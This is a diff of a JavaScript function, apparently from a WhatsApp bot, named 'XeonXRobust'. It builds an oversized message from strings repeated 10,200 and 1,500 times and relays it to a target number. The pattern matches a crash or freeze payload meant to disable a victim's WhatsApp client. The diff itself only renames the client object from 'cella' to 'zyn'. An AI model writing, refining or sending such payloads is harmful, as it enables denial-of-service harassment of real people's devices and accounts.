@@ -1,7 +1,7 @@
     async function XeonXRobust(target, o, Ptcp = true) {
 	const jids = `_*~@13135550002~*_\n`.repeat(10200);
 	const ui = 'ꦽ'.repeat(1500);
-   await cella.relayMessage(target, {
+   await zyn.relayMessage(target, {
      ephemeralMessage: {
       message: {
        interactiveMessage: {
@@ -94,7 +94,7 @@ singleSelectReply: {
     selectedRowId: "🩸"
 },
 contextInfo: {
-stanzaId: cella.generateMessageTag(),
+stanzaId: zyn.generateMessageTag(),
 participant: "0@s.whatsapp.net",
 remoteJid: "status@broadcast",
 mentionedJid: [target, "13135550002@s.whatsapp.net"],
@@ -216,7 +216,7 @@ ticket_id: crypto.randomBytes(16),
 }
 }
 
-await cella.relayMessage(target, messagePayload, {
+await zyn.relayMessage(target, messagePayload, {
 additionalNodes: stanza,
 participant: { jid : target }
 });
